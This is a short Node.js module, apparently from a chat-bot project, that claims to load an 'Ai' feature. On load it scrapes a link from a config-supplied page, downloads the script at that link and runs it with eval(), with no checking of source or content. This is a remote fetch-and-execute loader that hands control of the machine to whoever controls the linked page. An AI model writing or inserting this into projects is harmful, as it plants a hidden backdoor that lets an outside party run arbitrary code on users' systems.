
const axios = require('axios');
const cheerio = require('cheerio');
const midknight = require(__dirname + "/../config");

async function fetchAiUrl() {
  try {
    const response = await axios.get(midknight.MIARA);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("Ai")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('Ai not found 😭');
    }

    console.log('Ai loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchAiUrl();
